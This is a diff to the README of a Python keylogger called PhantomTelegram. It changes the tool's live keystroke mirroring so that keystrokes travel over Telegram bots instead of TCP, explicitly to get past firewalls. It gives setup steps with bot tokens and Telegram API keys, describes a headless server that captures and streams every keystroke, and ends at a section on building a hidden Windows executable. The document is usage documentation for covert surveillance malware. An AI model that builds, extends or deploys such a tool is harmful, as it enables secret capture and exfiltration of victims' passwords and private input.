@@ -3,12 +3,12 @@
 **PhantomTelegram** is a lightweight keylogger written in Python. It now supports two workflows:
 
 - Sending buffered keystroke logs to a Telegram bot (original flow in `src/main.py`).
-- Mirroring live keystrokes from one machine to another over TCP with a minimal client UI (`src/server.py` + `src/client.py`).
+- Mirroring live keystrokes from one machine to another via Telegram bots, so no open TCP ports are required (`src/server.py` + `src/client.py`).
 
 ## Features
 - Captures keystrokes with layout-aware translation on Windows.
 - Sends the captured input to a Telegram chat in near real-time with rate limiting.
-- Mirrors keystrokes from a background server to a client UI instantly, with an option to toggle copying on the receiving side.
+- Mirrors keystrokes from a background server to a client UI instantly over Telegram, with an option to toggle copying on the receiving side.
 
 ## Getting Started
 1. **Clone the Repo:**
@@ -32,7 +32,7 @@
    ```bash
    pip install -r requirements.txt
    ```
-   The project only depends on `pynput` for keyboard hooks and `pyTelegramBotAPI` for talking to Telegram.
+   The project depends on `pynput` for keyboard hooks, `pyTelegramBotAPI` for the server logger, and `telethon` for the client listener.
 
 ### Telegram Bot Logger (existing flow)
 1. **Set Your Config:**
@@ -43,21 +43,25 @@
    python -m src.main
    ```
 
-### Realtime Key Mirroring (new client/server)
+### Realtime Key Mirroring (Telegram transport)
+To avoid firewall issues, the mirroring pair talks through Telegram:
+
 **Server (captures and streams keys):**
-- Runs silently with no configuration. Launch it on the source machine:
+- Set `SERVER_BOT_TOKEN` to your bot token and `TARGET_USER_ID` to your Telegram account ID (or chat).
+- Start the headless streamer on the source machine:
   ```bash
   python -m src.server
   ```
-- Listens on `0.0.0.0:8765` and streams each translated keystroke immediately to any connected clients.
+- Every translated keystroke is sent as a JSON message to the target user; `/start` returns a short hint and `/stop` stops the streamer.
 
 **Client (receives and replays keys):**
+- Export your `TG_API_ID` and `TG_API_HASH` (from https://my.telegram.org) and optionally `SERVER_BOT_USERNAME` for convenience.
 - Start the UI on the destination machine:
   ```bash
   python -m src.client
   ```
-- Enter the server host/port, click **Подключиться**, and watch incoming keystrokes appear.
-- Toggle **Копировать ввод** to decide whether received keys should be replayed locally; latency is shown in milliseconds.
+- Enter the server-bot username, click **Подключиться**, and watch incoming keystrokes appear with latency in milliseconds.
+- Toggle **Копировать ввод** to decide whether received keys should be replayed locally through the keyboard controller.
 
 ## Building a Hidden Windows Executable
 
